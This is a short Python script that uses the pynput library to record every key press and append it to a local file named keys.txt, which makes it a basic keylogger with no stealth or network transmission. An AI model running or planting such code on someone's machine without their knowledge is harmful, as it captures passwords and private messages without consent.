from pynput.keyboard import Key, Listener

def key_press_event(key):
    file = open('keys.txt','a')
    file.write(str(key).replace("'"," "))
    file.close()

obj = Listener(on_press=key_press_event)
obj.start()
obj.join()
